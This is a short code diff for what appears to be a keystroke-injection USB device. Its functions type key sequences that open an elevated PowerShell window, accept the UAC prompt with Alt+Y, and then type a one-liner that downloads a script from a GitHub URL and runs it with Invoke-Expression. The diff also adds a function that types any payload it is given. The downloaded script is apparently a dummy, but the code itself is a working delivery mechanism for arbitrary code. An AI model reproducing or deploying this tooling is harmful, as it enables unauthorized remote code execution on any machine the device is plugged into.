@@ -17,8 +17,9 @@ void KEYBOARD::openPS() {
     Keyboard.press('a');
     delay(50);
     Keyboard.release('a');
-    delay(250);
+    delay(300);
     Keyboard.press(KEY_LEFT_ALT);
+    delay(10);
     Keyboard.press('y');
     delay(150);
     Keyboard.releaseAll();
@@ -28,6 +29,13 @@ void KEYBOARD::pullScript() {
     KEYBOARD::openPS();
     delay(500);
     Keyboard.println("$ScriptFromGitHub = Invoke-WebRequest https://raw.githubusercontent.com/mr-foxi/dummyPayload/refs/heads/main/dummyPayload.ps1; Invoke-Expression $($ScriptFromGitHub.Content)");
+    Serial1.println("#Roger Roger#");
+}
+
+void KEYBOARD::runPayload(String payload) {
+    KEYBOARD::openPS();
+    delay(500);
+    Keyboard.println(payload);
     Serial1.println("#Roger Roger#");
 }
 
